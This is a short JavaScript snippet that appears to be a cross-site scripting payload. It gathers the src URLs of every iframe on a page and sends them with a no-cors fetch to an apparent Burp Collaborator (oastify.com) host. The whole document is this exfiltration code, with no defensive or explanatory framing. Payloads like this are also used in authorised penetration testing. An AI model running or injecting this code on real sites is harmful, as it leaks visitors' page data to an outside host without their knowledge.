// Find a specific iframe (e.g., one with a specific class or ID)
let iframeSrc = document.querySelector('iframe#specific-id').getAttribute('src');

// Or extract sources from all iframes
let allIframes = document.querySelectorAll('iframe');
let allSrcs = Array.from(allIframes).map(iframe => iframe.getAttribute('src')).join(',');

fetch('https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(allSrcs), {
  method: 'GET',
  mode: 'no-cors'
});
